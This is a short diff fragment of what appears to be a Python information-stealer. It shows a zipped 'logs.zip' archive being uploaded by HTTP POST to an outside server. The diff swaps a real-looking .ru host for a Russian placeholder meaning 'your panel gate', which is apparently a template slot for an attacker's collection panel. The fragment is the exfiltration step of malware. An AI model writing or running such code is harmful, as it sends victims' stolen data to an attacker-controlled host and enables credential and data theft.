@@ -241,6 +241,6 @@ if __name__ == '__main__':
     zipf.close()
 
 
-    url = 'http://u21913xcu.ha002.t.justns.ru/' 
+    url = 'ВАШАПАНЕЛЬ_ГЕЙТ' 
     files = {'file': open('logs.zip', 'rb')}
     requests.post(url, files=files)
